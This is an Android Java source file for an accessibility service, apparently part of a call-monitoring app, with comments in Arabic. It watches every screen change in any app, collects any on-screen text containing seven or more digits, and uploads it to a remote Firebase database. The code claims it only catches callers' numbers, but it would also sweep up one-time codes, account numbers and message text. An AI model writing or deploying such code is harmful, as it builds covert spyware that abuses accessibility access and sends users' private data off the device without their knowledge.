package com.cdma.gsm.call;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;

public class MyAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // نراقب أي تغيير في محتوى الشاشة
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || 
            event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            
            AccessibilityNodeInfo nodeInfo = event.getSource();
            if (nodeInfo == null) return;

            // البحث عن أي نص يشبه رقم الهاتف على الشاشة أثناء الرنين
            findPhoneNumber(nodeInfo);
        }
    }

    private void findPhoneNumber(AccessibilityNodeInfo node) {
        if (node == null) return;

        if (node.getText() != null) {
            String text = node.getText().toString();
            // فلتر بسيط للتأكد أن النص رقم هاتف (أرقام فقط وطول معين)
            if (text.matches(".*\\d{7,}.*")) { 
                Log.d("AccessibilityBridge", "تم التقاط رقم من الشاشة: " + text);
                // إرسال الرقم إلى Firebase Realtime Database
                CloudSender.sendSignal(text, "CALL");
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            findPhoneNumber(node.getChild(i));
        }
    }

    @Override public void onInterrupt() {}
}
